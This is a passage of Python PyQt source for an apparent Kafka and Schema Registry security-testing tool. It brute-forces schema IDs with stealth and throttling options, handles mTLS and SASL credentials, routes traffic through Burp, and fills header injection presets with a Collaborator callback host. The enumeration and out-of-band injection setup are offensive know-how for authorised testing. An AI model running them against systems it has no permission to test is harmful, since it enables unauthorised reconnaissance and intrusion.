    def _on_fetch_result(self, pretty: str, schema_type: str):
        self._set_status(f"schema loaded  [{schema_type}]", "ok")
        self.schema_view.append_line("─" * 60, "muted")
        for line in pretty.splitlines():
            self.schema_view.append_line(line, "data")
        try:
            self._last_schema = json.loads(pretty)
        except ValueError:
            self._last_schema = None

    def _on_fetch_error(self, msg: str):
        self._set_status(f"! {msg}", "err")
        self.schema_view.append_line(f"error: {msg}", "error")

    def _on_enum_start(self):
        url = self.inp_url.text().strip()
        if not url:
            self._set_status("! registry URL required", "err"); return
        if self._enum_worker and self._enum_worker.isRunning(): return
        id_from = self.inp_enum_from.value(); id_to = self.inp_enum_to.value()
        if id_from > id_to:
            self._set_status("! 'from' must be ≤ 'to'", "err"); return
        proxy_url = self._proxy_url()
        self.schema_view.clear_log()
        self.schema_view.append_line(f"// Enumerating IDs {id_from}..{id_to}  via {url}", "muted")
        if proxy_url: self.schema_view.append_line(f"[proxy] {proxy_url}", "warn")
        self._set_status(f"scanning IDs {id_from}–{id_to} …", "inf")
        self.enum_progress.setMaximum(id_to - id_from + 1); self.enum_progress.setValue(0)
        self.btn_enum.setEnabled(False); self.btn_stop_enum.setEnabled(True)
        self._enum_worker = SchemaEnumWorker(
            url, id_from, id_to, self._tls_cfg(), proxy_url,
            delay_ms=self.inp_enum_delay.value(),
            stealth=self.chk_enum_stealth.isChecked(),
        )
        self._enum_worker.found.connect(self._on_enum_found)
        self._enum_worker.progress.connect(lambda d, t: self.enum_progress.setValue(d))
        self._enum_worker.throttled.connect(self._on_throttled)
        self._enum_worker.done.connect(self._on_enum_done)
        self._enum_worker.start()

    def _on_enum_found(self, sid: int, body: str):
        self.schema_view.append_line(f"[FOUND] schema_id={sid}", "ok")
        try:
            parsed = json.loads(body)
            self.schema_view.append_line(
                f"        type={parsed.get('schemaType','AVRO')}  len={len(body)}", "data")
        except Exception:
            self.schema_view.append_line(f"        raw: {body[:80]}", "data")

    def _on_enum_stop(self):
        if self._enum_worker: self._enum_worker.stop()

    def _on_throttled(self, sid: int, ms: int):
        self.schema_view.append_line(
            f"[THROTTLED] schema_id={sid} — 429 received, backing off {ms} ms", "warn"
        )

    def _on_enum_done(self, found: int):
        self.btn_enum.setEnabled(True); self.btn_stop_enum.setEnabled(False)
        self._set_status(f"enumeration complete — {found} schema(s) found", "ok")
        if found > 0:
            FindingStore.get().add(Finding(
                severity="INFO",
                title=f"Schema Registry: {found} schema ID(s) found via brute-force",
                description=(
                    f"Schema Registry returned {found} schemas in ID range "
                    f"{self.inp_enum_from.value()}–{self.inp_enum_to.value()}. "
                    "Verify access is restricted to authorised clients."
                ),
                evidence=f"Enumerated IDs {self.inp_enum_from.value()}–{self.inp_enum_to.value()}, found {found}.",
                phase="recon",
            ))

    def _set_status(self, text: str, kind: str):
        obj = {"ok": "lbl_status_ok", "err": "lbl_status_err", "inf": "lbl_status_inf"}.get(kind, "lbl_status_inf")
        self.lbl_schema_status.setText(text); self.lbl_schema_status.setObjectName(obj)
        self.lbl_schema_status.style().unpolish(self.lbl_schema_status)
        self.lbl_schema_status.style().polish(self.lbl_schema_status)


# ─────────────────────────────────────────────────────────
#  CertPanel
# ─────────────────────────────────────────────────────────

class CertPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ mTLS CERTIFICATES ]")
        self._build()

    def _build(self):
        grid = QGridLayout(self); grid.setSpacing(8); grid.setColumnStretch(1, 1)
        toggle_row = QHBoxLayout()
        self.chk_mtls_sr     = QCheckBox("mTLS — Schema Registry")
        self.chk_mtls_broker = QCheckBox("mTLS — Kafka Broker")
        self.lbl_mtls_hint   = QLabel("enable per target to activate certificate fields below")
        self.lbl_mtls_hint.setObjectName("lbl_status_inf")
        self.chk_mtls_sr.setChecked(False); self.chk_mtls_broker.setChecked(False)
        toggle_row.addWidget(self.chk_mtls_sr); toggle_row.addSpacing(24)
        toggle_row.addWidget(self.chk_mtls_broker); toggle_row.addSpacing(16)
        toggle_row.addWidget(self.lbl_mtls_hint); toggle_row.addStretch()
        grid.addLayout(toggle_row, 0, 0, 1, 3)
        sep = QFrame(); sep.setFrameShape(QFrame.Shape.HLine); grid.addWidget(sep, 1, 0, 1, 3)
        fields = [("CA Cert", "ca_cert", "ca-cert.pem"), ("Client Cert", "client_cert", "client-cert.pem"),
                  ("Client Key", "client_key", "client-key.pem")]
        self._paths = {}; self._cert_labels = []; self._cert_inputs = []; self._cert_buttons = []
        for i, (label, key, hint) in enumerate(fields):
            row = i + 2
            lbl = QLabel(label); lbl.setObjectName("lbl_key")
            inp = QLineEdit(); inp.setPlaceholderText(hint)
            btn = QPushButton("BROWSE"); btn.setFixedWidth(80)
            btn.clicked.connect(lambda _, k=key: self._browse(k))
            self._paths[key] = inp; self._cert_labels.append(lbl)
            self._cert_inputs.append(inp); self._cert_buttons.append(btn)
            grid.addWidget(lbl, row, 0); grid.addWidget(inp, row, 1); grid.addWidget(btn, row, 2)
        pr = len(fields) + 2
        lbl_pass = QLabel("Key Passphrase"); lbl_pass.setObjectName("lbl_key")
        self.inp_passphrase = QLineEdit()
        self.inp_passphrase.setPlaceholderText("leave empty if not required")
        self.inp_passphrase.setEchoMode(QLineEdit.EchoMode.Password)
        self._cert_labels.append(lbl_pass); self._cert_inputs.append(self.inp_passphrase)
        grid.addWidget(lbl_pass, pr, 0); grid.addWidget(self.inp_passphrase, pr, 1, 1, 2)
        vr = pr + 1
        self.chk_verify = QCheckBox("Verify server certificate"); self.chk_verify.setChecked(True)
        self.lbl_verify_note = QLabel("uncheck to skip CA validation — useful for self-signed certs")
        self.lbl_verify_note.setObjectName("lbl_status_inf")
        self._cert_labels.append(self.lbl_verify_note)
        grid.addWidget(self.chk_verify, vr, 0, 1, 2); grid.addWidget(self.lbl_verify_note, vr + 1, 0, 1, 3)

        # ── SASL authentication section ← Sprint 1 ────────────────────────
        sep_sasl = QFrame(); sep_sasl.setFrameShape(QFrame.Shape.HLine)
        grid.addWidget(sep_sasl, vr + 2, 0, 1, 3)

        self.chk_sasl = QCheckBox("Enable SASL authentication")
        self.chk_sasl.setToolTip(
            "Adds SASL credentials to broker connections.\n"
            "Combines with mTLS when both are enabled (SASL_SSL)."
        )
        grid.addWidget(self.chk_sasl, vr + 3, 0, 1, 3)

        lbl_mech = QLabel("Mechanism"); lbl_mech.setObjectName("lbl_key")
        self.cmb_sasl_mech = QComboBox()
        self.cmb_sasl_mech.addItems(["PLAIN", "SCRAM-SHA-256", "SCRAM-SHA-512"])
        self.cmb_sasl_mech.setEnabled(False)
        grid.addWidget(lbl_mech, vr + 4, 0); grid.addWidget(self.cmb_sasl_mech, vr + 4, 1, 1, 2)

        lbl_user = QLabel("Username"); lbl_user.setObjectName("lbl_key")
        self.inp_sasl_user = QLineEdit()
        self.inp_sasl_user.setPlaceholderText("sasl-username")
        self.inp_sasl_user.setEnabled(False)
        grid.addWidget(lbl_user, vr + 5, 0); grid.addWidget(self.inp_sasl_user, vr + 5, 1, 1, 2)

        lbl_sasl_pw = QLabel("Password"); lbl_sasl_pw.setObjectName("lbl_key")
        self.inp_sasl_pass = QLineEdit()
        self.inp_sasl_pass.setPlaceholderText("sasl-password")
        self.inp_sasl_pass.setEchoMode(QLineEdit.EchoMode.Password)
        self.inp_sasl_pass.setEnabled(False)
        self._sasl_widgets = [self.cmb_sasl_mech, self.inp_sasl_user, self.inp_sasl_pass]
        grid.addWidget(lbl_sasl_pw, vr + 6, 0); grid.addWidget(self.inp_sasl_pass, vr + 6, 1, 1, 2)

        self.lbl_sasl_hint = QLabel("protocol = SASL_PLAINTEXT  |  with mTLS: SASL_SSL")
        self.lbl_sasl_hint.setObjectName("lbl_status_inf"); self.lbl_sasl_hint.setVisible(False)
        grid.addWidget(self.lbl_sasl_hint, vr + 7, 0, 1, 3)

        self.chk_mtls_sr.toggled.connect(self._on_toggle)
        self.chk_mtls_broker.toggled.connect(self._on_toggle)
        self.chk_sasl.toggled.connect(self._on_sasl_toggle)
        self._on_toggle()

    def _any_mtls_active(self) -> bool:
        return self.chk_mtls_sr.isChecked() or self.chk_mtls_broker.isChecked()

    def _on_toggle(self):
        active = self._any_mtls_active()
        for w in self._cert_inputs + self._cert_buttons + self._cert_labels:
            w.setEnabled(active)
        self.chk_verify.setEnabled(active)
        if active:
            targets = []
            if self.chk_mtls_sr.isChecked(): targets.append("SR")
            if self.chk_mtls_broker.isChecked(): targets.append("broker")
            self.lbl_mtls_hint.setText(f"certificates applied to: {', '.join(targets)}")
        else:
            self.lbl_mtls_hint.setText("enable per target to activate certificate fields below")

    def _on_sasl_toggle(self, checked: bool):
        for w in self._sasl_widgets:
            w.setEnabled(checked)
        self.lbl_sasl_hint.setVisible(checked)
        if checked:
            mtls = self._any_mtls_active()
            proto = "SASL_SSL" if mtls else "SASL_PLAINTEXT"
            self.lbl_sasl_hint.setText(f"protocol = {proto}  (mechanism: {self.cmb_sasl_mech.currentText()})")

    def _browse(self, key: str):
        path, _ = QFileDialog.getOpenFileName(self, "Select file", "", "PEM Files (*.pem *.crt *.key);;All Files (*)")
        if path: self._paths[key].setText(path)

    def get_tls_config(self) -> dict:
        certs = {
            "ca_cert": self._paths["ca_cert"].text(), "client_cert": self._paths["client_cert"].text(),
            "client_key": self._paths["client_key"].text(), "key_passphrase": self.inp_passphrase.text(),
            "verify": self.chk_verify.isChecked(),
        }
        sasl = None
        if self.chk_sasl.isChecked():
            sasl = {
                "mechanism": self.cmb_sasl_mech.currentText(),
                "username":  self.inp_sasl_user.text().strip(),
                "password":  self.inp_sasl_pass.text(),
            }
        return {
            "schema_registry": certs if self.chk_mtls_sr.isChecked()     else None,
            "broker":          certs if self.chk_mtls_broker.isChecked() else None,
            "sasl":            sasl,
        }


# ─────────────────────────────────────────────────────────
#  EncryptionPanel
# ─────────────────────────────────────────────────────────

class EncryptionPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ PAYLOAD ENCRYPTION ]")
        self._build()

    def _build(self):
        grid = QGridLayout(self); grid.setSpacing(8); grid.setColumnStretch(1, 1)
        lbl_mode = QLabel("Cipher Mode"); lbl_mode.setObjectName("lbl_key")
        self.cmb_mode = QComboBox()
        self.cmb_mode.addItems(["None (Avro only)", "AES-128-CBC", "AES-256-CBC",
                                 "AES-128-GCM", "AES-256-GCM", "ChaCha20-Poly1305"])
        self.cmb_mode.currentIndexChanged.connect(self._on_mode_change)
        grid.addWidget(lbl_mode, 0, 0); grid.addWidget(self.cmb_mode, 0, 1)
        lbl_secret = QLabel("Shared Secret"); lbl_secret.setObjectName("lbl_key")
        self.inp_secret = QLineEdit(); self.inp_secret.setPlaceholderText("hex or UTF-8 secret key")
        self.inp_secret.setEchoMode(QLineEdit.EchoMode.Password); self.inp_secret.setEnabled(False)
        self.btn_reveal = QPushButton("SHOW"); self.btn_reveal.setFixedWidth(60)
        self.btn_reveal.setEnabled(False); self.btn_reveal.setCheckable(True)
        self.btn_reveal.toggled.connect(self._toggle_reveal)
        grid.addWidget(lbl_secret, 1, 0); grid.addWidget(self.inp_secret, 1, 1); grid.addWidget(self.btn_reveal, 1, 2)
        lbl_enc = QLabel("Key Encoding"); lbl_enc.setObjectName("lbl_key")
        self.cmb_encoding = QComboBox(); self.cmb_encoding.addItems(["hex", "base64", "utf-8 raw"]); self.cmb_encoding.setEnabled(False)
        grid.addWidget(lbl_enc, 2, 0); grid.addWidget(self.cmb_encoding, 2, 1)
        lbl_iv = QLabel("IV / Nonce"); lbl_iv.setObjectName("lbl_key")
        self.cmb_iv = QComboBox(); self.cmb_iv.addItems(["Random per message", "Fixed (provide below)", "Prepended to ciphertext"]); self.cmb_iv.setEnabled(False)
        grid.addWidget(lbl_iv, 3, 0); grid.addWidget(self.cmb_iv, 3, 1)
        self.inp_fixed_iv = QLineEdit(); self.inp_fixed_iv.setPlaceholderText("fixed IV in hex (optional)"); self.inp_fixed_iv.setEnabled(False)
        grid.addWidget(self.inp_fixed_iv, 4, 1, 1, 2)

    def _on_mode_change(self, idx: int):
        enc = idx > 0
        self.inp_secret.setEnabled(enc); self.btn_reveal.setEnabled(enc)
        self.cmb_encoding.setEnabled(enc); self.cmb_iv.setEnabled(enc); self.inp_fixed_iv.setEnabled(enc)

    def _toggle_reveal(self, checked: bool):
        self.inp_secret.setEchoMode(QLineEdit.EchoMode.Normal if checked else QLineEdit.EchoMode.Password)
        self.btn_reveal.setText("HIDE" if checked else "SHOW")

    def get_config(self) -> dict:
        return {"mode": self.cmb_mode.currentText(), "secret": self.inp_secret.text(),
                "encoding": self.cmb_encoding.currentText(), "iv_mode": self.cmb_iv.currentText(),
                "fixed_iv": self.inp_fixed_iv.text()}


# ─────────────────────────────────────────────────────────
#  ProxyPanel  [NEW]
# ─────────────────────────────────────────────────────────

class ProxyPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ PROXY / BURP INTEGRATION ]")
        self._build()

    def _build(self):
        grid = QGridLayout(self); grid.setSpacing(8); grid.setColumnStretch(1, 1)
        self.chk_enable = QCheckBox("Enable HTTP proxy")
        self.chk_enable.setChecked(False); self.chk_enable.toggled.connect(self._on_toggle)
        grid.addWidget(self.chk_enable, 0, 0, 1, 3)
        lbl_proxy = QLabel("Proxy URL"); lbl_proxy.setObjectName("lbl_key")
        self.inp_proxy = QLineEdit(); self.inp_proxy.setText("http://127.0.0.1:8080"); self.inp_proxy.setEnabled(False)
        self.btn_test = QPushButton("TEST"); self.btn_test.setFixedWidth(60); self.btn_test.setEnabled(False)
        self.btn_test.clicked.connect(self._on_test)
        grid.addWidget(lbl_proxy, 1, 0); grid.addWidget(self.inp_proxy, 1, 1); grid.addWidget(self.btn_test, 1, 2)
        scope_row = QHBoxLayout()
        self.chk_scope_sr = QCheckBox("Schema Registry"); self.chk_scope_sr.setChecked(True); self.chk_scope_sr.setEnabled(False)
        scope_row.addWidget(QLabel("Route:")); scope_row.addWidget(self.chk_scope_sr); scope_row.addStretch()
        grid.addLayout(scope_row, 2, 0, 1, 3)
        sep = QFrame(); sep.setFrameShape(QFrame.Shape.HLine); grid.addWidget(sep, 3, 0, 1, 3)
        lbl_collab = QLabel("Collaborator URL"); lbl_collab.setObjectName("lbl_key")
        self.inp_collab = QLineEdit(); self.inp_collab.setPlaceholderText("xxxxxxxx.oastify.com  (without http://)")
        grid.addWidget(lbl_collab, 4, 0); grid.addWidget(self.inp_collab, 4, 1, 1, 2)
        lbl_note = QLabel("Collaborator URL substituted for COLLAB placeholder in injection presets.")
        lbl_note.setObjectName("lbl_status_inf"); lbl_note.setWordWrap(True)
        grid.addWidget(lbl_note, 5, 0, 1, 3)
        self.lbl_status = QLabel("proxy disabled"); self.lbl_status.setObjectName("lbl_status_inf")
        grid.addWidget(self.lbl_status, 6, 0, 1, 3)

    def _on_toggle(self, checked: bool):
        self.inp_proxy.setEnabled(checked); self.btn_test.setEnabled(checked); self.chk_scope_sr.setEnabled(checked)
        kind = "lbl_status_warn" if checked else "lbl_status_inf"
        self.lbl_status.setText(f"proxy ACTIVE → {self.inp_proxy.text()}" if checked else "proxy disabled")
        self.lbl_status.setObjectName(kind)
        self.lbl_status.style().unpolish(self.lbl_status); self.lbl_status.style().polish(self.lbl_status)

    def _on_test(self):
        proxy_url = self.inp_proxy.text().strip()
        if not proxy_url: return
        try:
            r = requests.get("http://burp/", proxies={"http": proxy_url, "https": proxy_url}, timeout=3, verify=False)
            self.lbl_status.setText(f"proxy reachable  (HTTP {r.status_code})")
            self.lbl_status.setObjectName("lbl_status_ok")
        except requests.exceptions.ConnectionError:
            self.lbl_status.setText("proxy unreachable — is Burp running?")
            self.lbl_status.setObjectName("lbl_status_err")
        except Exception as exc:
            self.lbl_status.setText(f"proxy test error: {exc}")
            self.lbl_status.setObjectName("lbl_status_warn")
        self.lbl_status.style().unpolish(self.lbl_status); self.lbl_status.style().polish(self.lbl_status)

    def get_proxy_url(self) -> str | None:
        if self.chk_enable.isChecked():
            url = self.inp_proxy.text().strip()
            return url if url else None
        return None

    def get_collaborator_url(self) -> str:
        return self.inp_collab.text().strip()


# ─────────────────────────────────────────────────────────
#  HeadersWidget  [NEW]
# ─────────────────────────────────────────────────────────

class HeadersWidget(QWidget):
    def __init__(self, proxy_panel=None, parent=None):
        super().__init__(parent)
        self._proxy_panel = proxy_panel
        self._build()

    def _build(self):
        layout = QVBoxLayout(self); layout.setContentsMargins(0, 0, 0, 0); layout.setSpacing(4)
        top = QHBoxLayout()
        lbl_preset = QLabel("Preset"); lbl_preset.setObjectName("lbl_key")
        self.cmb_preset = QComboBox(); self.cmb_preset.setMinimumWidth(200)
        self.cmb_preset.addItem("— select injection preset —")
        for name in INJECTION_PRESETS:
            if name != "Custom": self.cmb_preset.addItem(name)
        self.cmb_preset.currentTextChanged.connect(self._on_preset)
        self.btn_add_row = QPushButton("+")
        self.btn_add_row.setObjectName("btn_icon")
        self.btn_del_row = QPushButton("−")
        self.btn_del_row.setObjectName("btn_icon")
        self.btn_add_row.clicked.connect(lambda: self._add_row()); self.btn_del_row.clicked.connect(self._del_row)
        top.addWidget(lbl_preset); top.addWidget(self.cmb_preset, 1)
        top.addSpacing(8); top.addWidget(self.btn_add_row); top.addWidget(self.btn_del_row)
        layout.addLayout(top)
        self.table = QTableWidget(0, 2)
        self.table.setHorizontalHeaderLabels(["Header Name", "Header Value"])
        self.table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self.table.horizontalHeader().setDefaultSectionSize(180)
        self.table.setAlternatingRowColors(True); self.table.setMaximumHeight(120)
        self.table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        layout.addWidget(self.table)

    def _add_row(self, name: str = "X-Correlation-ID", value: str = ""):
        row = self.table.rowCount(); self.table.insertRow(row)
        self.table.setItem(row, 0, QTableWidgetItem(name))
        self.table.setItem(row, 1, QTableWidgetItem(value))
        self.table.setCurrentCell(row, 1)

    def _del_row(self):
        row = self.table.currentRow()
        if row >= 0: self.table.removeRow(row)

    def _on_preset(self, text: str):
        if text.startswith("—"): return
        payload = INJECTION_PRESETS.get(text, "")
        if self._proxy_panel and "COLLAB" in payload:
            collab = self._proxy_panel.get_collaborator_url()
            if collab: payload = payload.replace("COLLAB", collab)
        if self.table.rowCount() == 0:
            for h in DEFAULT_INJECT_HEADERS: self._add_row(h, payload)
        else:
            for row in range(self.table.rowCount()):
                vi = self.table.item(row, 1)
                if vi is not None: vi.setText(payload)
                else: self.table.setItem(row, 1, QTableWidgetItem(payload))

    def get_headers(self) -> list[tuple[str, str]]:
        result = []
        for row in range(self.table.rowCount()):
            ni = self.table.item(row, 0); vi = self.table.item(row, 1)
            name = ni.text().strip() if ni else ""; val = vi.text() if vi else ""
            if name: result.append((name, val))
        return result

    def set_proxy_panel(self, p): self._proxy_panel = p


# ─────────────────────────────────────────────────────────
#  RandomizerPanel
# ─────────────────────────────────────────────────────────

class RandomizerPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ AVRO DATA RANDOMIZER ]")
        self._schema_panel = None; self._last_payload = None
        self._engine = AvroRandomizer(); self._gen_count = 0
        self._build()

    def set_schema_panel(self, p): self._schema_panel = p
    def get_last_payload(self) -> dict | None: return self._last_payload

    def _build(self):
        vbox = QVBoxLayout(self); vbox.setSpacing(8)
        top = QHBoxLayout()
        self.btn_randomize = QPushButton("GENERATE RANDOM PAYLOAD"); self.btn_randomize.setObjectName("btn_accent")
        self.btn_copy = QPushButton("COPY JSON"); self.btn_clear = QPushButton("CLEAR")
        self.lbl_count = QLabel("0 generated"); self.lbl_count.setObjectName("lbl_status_inf")
        top.addWidget(self.btn_randomize); top.addWidget(self.btn_copy)
        top.addWidget(self.btn_clear); top.addSpacing(12); top.addWidget(self.lbl_count); top.addStretch()
        self.lbl_note = QLabel("schema must be loaded first")
        self.payload_view = LogPane("// generated payload will appear here")
        vbox.addLayout(top); vbox.addWidget(self.lbl_note); vbox.addWidget(self.payload_view)
        self.btn_randomize.clicked.connect(self._on_randomize)
        self.btn_copy.clicked.connect(self._on_copy)
        self.btn_clear.clicked.connect(self._on_clear)

    def _on_randomize(self):
        if self._schema_panel is None:
            self.payload_view.append_line("! schema panel not connected", "error"); return
        schema = self._schema_panel.get_loaded_schema()
        if schema is None:
            self.payload_view.append_line("! no schema loaded — fetch a schema in the SCHEMA tab first", "error"); return
        try:
            payload = self._engine.generate(schema)
        except Exception as exc:
            self.payload_view.append_line(f"! generation error: {exc}", "error"); return
        self._last_payload = payload; self._gen_count += 1
        self.lbl_count.setText(f"{self._gen_count} generated")
        pretty = json.dumps(payload, indent=2, ensure_ascii=False)
        self.payload_view.clear_log()
        self.payload_view.append_line(f"// payload #{self._gen_count}  —  {len(pretty)} bytes", "muted")
        self.payload_view.append_line("─" * 60, "muted")
        for line in pretty.splitlines(): self.payload_view.append_line(line, "data")

    def _on_copy(self):
        if self._last_payload:
            QApplication.clipboard().setText(json.dumps(self._last_payload, indent=2, ensure_ascii=False))

    def _on_clear(self):
        self.payload_view.clear_log(); self._last_payload = None
        self._gen_count = 0; self.lbl_count.setText("0 generated")


# ─────────────────────────────────────────────────────────
#  KafkaBrokerBar
# ─────────────────────────────────────────────────────────

class KafkaBrokerBar(QWidget):
    def __init__(self, show_group: bool = False):
        super().__init__()
        row = QHBoxLayout(self); row.setContentsMargins(0, 0, 0, 0); row.setSpacing(6)
        lbl_b = QLabel("Broker"); lbl_b.setObjectName("lbl_key")
        self.inp_broker = QLineEdit(); self.inp_broker.setPlaceholderText("broker:9092")
        lbl_t = QLabel("Topic"); lbl_t.setObjectName("lbl_key")
        self.inp_topic  = QLineEdit(); self.inp_topic.setPlaceholderText("topic-name")
        row.addWidget(lbl_b); row.addWidget(self.inp_broker, 2)
        row.addWidget(lbl_t); row.addWidget(self.inp_topic, 2)
        if show_group:
            lbl_g = QLabel("Consumer Group"); lbl_g.setObjectName("lbl_key")
            self.inp_group = QLineEdit(); self.inp_group.setPlaceholderText("kafkapt-consumer")
            row.addWidget(lbl_g); row.addWidget(self.inp_group, 2)

# ─────────────────────────────────────────────────────────
#  Background worker — Kafka consumer  (+ headers w sygnale)
# ─────────────────────────────────────────────────────────

class KafkaConsumerWorker(QThread):
    #                              topic  part  off  ts_type ts_ms  decoded  raw    headers
    message_received = pyqtSignal(str,   int,  int, int,    int,   str,     bytes, object)
    status_update    = pyqtSignal(str)
    consumer_error   = pyqtSignal(str)
    done             = pyqtSignal(int)

    MAX_EMPTY_POLLS = 10

    def __init__(self, broker: str, topic: str, group_id: str,
                 offset_mode: str, specific_offset: int, max_messages: int,
                 tls_cfg: dict | None, sasl_cfg: dict | None = None):
        super().__init__()
        self.broker          = broker
        self.topic           = topic
        self.group_id        = group_id
        self.offset_mode     = offset_mode
        self.specific_offset = specific_offset
        self.max_messages    = max_messages
        self.tls_cfg         = tls_cfg
        self.sasl_cfg        = sasl_cfg
        self._stop_flag      = threading.Event()
        self._err_queue      = queue.SimpleQueue()

    def stop(self): self._stop_flag.set()

    def _build_conf(self) -> dict:
        return _build_kafka_conf(self.broker, self.tls_cfg, self.sasl_cfg, extra={
            "group.id":           self.group_id,
            "auto.offset.reset":  "earliest" if self.offset_mode == "earliest" else "latest",
            "enable.auto.commit": False,
            "session.timeout.ms": 6000,
            "fetch.wait.max.ms":  500,
            "error_cb":           self._kafka_error_cb,
        })

    def _kafka_error_cb(self, err): self._err_queue.put(str(err))

    def _drain_errors(self):
        while not self._err_queue.empty():
            try: self.consumer_error.emit(self._err_queue.get_nowait())
            except queue.Empty: break

    @staticmethod
    def _decode_value(raw: bytes | None) -> str:
        if raw is None: return "<null value>"
        if len(raw) > 5 and raw[0] == 0x00:
            schema_id = int.from_bytes(raw[1:5], "big"); payload = raw[5:]
            return (
                f"[confluent-avro  schema_id={schema_id}  {len(payload)} bytes]\n"
                f"// load schema ID {schema_id} in SCHEMA tab to deserialize\n"
                f"{payload[:32].hex()}…"
            )
        try:
            return json.dumps(json.loads(raw.decode("utf-8")), indent=2, ensure_ascii=False)
        except Exception: pass
        try: return raw.decode("utf-8")
        except Exception: pass
        return f"<binary {len(raw)} bytes>  {raw[:32].hex()}"

    def run(self):
        try:
            from confluent_kafka import Consumer, TopicPartition, KafkaException, KafkaError
        except ImportError:
            self.consumer_error.emit("confluent-kafka not installed — run: pip install confluent-kafka"); return
        conf = self._build_conf()
        self.status_update.emit(
            f"connecting  broker={self.broker}  topic={self.topic}  "
            f"group={self.group_id}  offset={self.offset_mode}"
        )
        try:
            consumer = Consumer(conf)
        except KafkaException as exc:
            self.consumer_error.emit(f"consumer init failed: {exc}"); return

        received = 0; empty_polls = 0
        try:
            if self.offset_mode == "specific":
                try: meta = consumer.list_topics(self.topic, timeout=10)
                except KafkaException as exc:
                    self._drain_errors(); self.consumer_error.emit(f"failed to fetch topic metadata: {exc}"); return
                self._drain_errors()
                if self.topic not in meta.topics:
                    self.consumer_error.emit(f"topic '{self.topic}' not found on broker"); return
                t_meta = meta.topics[self.topic]
                if t_meta.error is not None:
                    self.consumer_error.emit(f"topic metadata error: {t_meta.error}"); return
                partitions = [TopicPartition(self.topic, pid, self.specific_offset) for pid in t_meta.partitions]
                consumer.assign(partitions)
                self.status_update.emit(f"assigned {len(partitions)} partition(s) at offset {self.specific_offset}")
            else:
                consumer.subscribe([self.topic]); self.status_update.emit("subscribed — waiting for messages …")

            while received < self.max_messages and not self._stop_flag.is_set():
                msg = consumer.poll(timeout=1.0); self._drain_errors()
                if msg is None:
                    empty_polls += 1
                    if empty_polls >= self.MAX_EMPTY_POLLS:
                        self.status_update.emit(f"no messages after {self.MAX_EMPTY_POLLS} polls — stopping"); break
                    continue
                empty_polls = 0
                if msg.error():
                    from confluent_kafka import KafkaError
                    ec = msg.error().code()
                    if ec == KafkaError._PARTITION_EOF:
                        self.status_update.emit(f"EOF  partition={msg.partition()}  offset={msg.offset()}")
                        if self.offset_mode in ("earliest", "specific"): break
                        continue
                    if ec == KafkaError._AUTHENTICATION:
                        self.consumer_error.emit(f"authentication failed: {msg.error()}"); break
                    if ec == KafkaError._SSL:
                        self.consumer_error.emit(f"SSL error: {msg.error()}"); break
                    self.consumer_error.emit(f"kafka error [{ec}]: {msg.error()}"); break

                ts_type, ts_raw = msg.timestamp()
                ts_ms   = ts_raw if ts_type in (1, 2) and ts_raw > 0 else 0
                decoded = self._decode_value(msg.value())
                headers = msg.headers() or []     # list[(str, bytes)]

                self.message_received.emit(
                    msg.topic(), msg.partition(), msg.offset(),
                    ts_type, ts_ms, decoded, msg.value() or b"", headers
                )
                received += 1
        except KafkaException as exc:
            self.consumer_error.emit(f"kafka exception: {exc}")
        except Exception as exc:
            self.consumer_error.emit(f"unexpected error: {exc}")
        finally:
            self._drain_errors(); consumer.close(); self.done.emit(received)


# ─────────────────────────────────────────────────────────
#  ReaderPanel v2  (+ headers display + NDJSON export)
# ─────────────────────────────────────────────────────────

class ReaderPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ READ FROM TOPIC ]")
        self._worker       = None
        self._cert_panel   = None
        self._schema_panel = None
        self._messages:    list[dict] = []
        self._current_idx: int = -1
        self._msg_count:   int = 0
        self._build()

    def set_cert_panel(self, p):   self._cert_panel   = p
    def set_schema_panel(self, p): self._schema_panel = p

    def _build(self):
        root = QVBoxLayout(self); root.setSpacing(8)
        self.broker_bar = KafkaBrokerBar(show_group=True); root.addWidget(self.broker_bar)

        opts = QHBoxLayout()
        lbl_off = QLabel("Start Offset"); lbl_off.setObjectName("lbl_key")
        self.cmb_offset = QComboBox(); self.cmb_offset.addItems(["latest", "earliest", "specific"])
        self.inp_offset_val = QSpinBox(); self.inp_offset_val.setRange(0, 99999999)
        self.inp_offset_val.setFixedWidth(100); self.inp_offset_val.setEnabled(False)
        self.cmb_offset.currentTextChanged.connect(lambda t: self.inp_offset_val.setEnabled(t == "specific"))
        lbl_cnt = QLabel("Max Messages"); lbl_cnt.setObjectName("lbl_key")
        self.inp_count = QSpinBox(); self.inp_count.setRange(1, 10000); self.inp_count.setValue(1); self.inp_count.setFixedWidth(80)
        opts.addWidget(lbl_off); opts.addWidget(self.cmb_offset); opts.addWidget(self.inp_offset_val)
        opts.addSpacing(16); opts.addWidget(lbl_cnt); opts.addWidget(self.inp_count); opts.addStretch()
        root.addLayout(opts)

        btns = QHBoxLayout()
        self.btn_read = QPushButton("READ MESSAGE(S)"); self.btn_read.setObjectName("btn_accent")
        self.btn_stop = QPushButton("STOP"); self.btn_stop.setObjectName("btn_danger"); self.btn_stop.setEnabled(False)
        self.btn_clear_log = QPushButton("CLEAR"); self.btn_export = QPushButton("EXPORT NDJSON")
        self.lbl_msg_count = QLabel("0 received"); self.lbl_msg_count.setObjectName("lbl_status_inf")
        btns.addWidget(self.btn_read); btns.addWidget(self.btn_stop); btns.addWidget(self.btn_clear_log)
        btns.addWidget(self.btn_export); btns.addSpacing(12); btns.addWidget(self.lbl_msg_count); btns.addStretch()
        root.addLayout(btns)

        splitter = QSplitter(Qt.Orientation.Horizontal); splitter.setHandleWidth(4)
        self.log = LogPane("// consumed messages will appear here"); splitter.addWidget(self.log)

        detail = QWidget(); detail_vbox = QVBoxLayout(detail)
        detail_vbox.setContentsMargins(6, 0, 0, 0); detail_vbox.setSpacing(6)

        nav = QHBoxLayout()
        self.btn_prev = QPushButton("< PREV"); self.btn_prev.setFixedWidth(70); self.btn_prev.setEnabled(False)
        self.lbl_nav  = QLabel("no messages"); self.lbl_nav.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.lbl_nav.setObjectName("lbl_status_inf"); self.lbl_nav.setMinimumWidth(100)
        self.btn_next = QPushButton("NEXT >"); self.btn_next.setFixedWidth(70); self.btn_next.setEnabled(False)
